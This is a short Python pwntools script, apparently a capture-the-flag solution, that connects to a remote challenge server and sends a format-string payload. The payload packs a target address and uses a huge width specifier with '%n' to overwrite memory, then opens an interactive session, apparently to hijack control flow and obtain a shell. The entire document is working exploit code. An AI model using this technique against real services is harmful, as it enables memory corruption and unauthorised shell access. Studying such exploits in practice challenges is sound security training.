from pwn import *
context.log_level = "DEBUG"

p = remote("ctf.j0n9hyun.xyz",3002)
payload = p32(0x804a00c) + "%134514096x%n"

p.sendline(payload)
p.interactive()
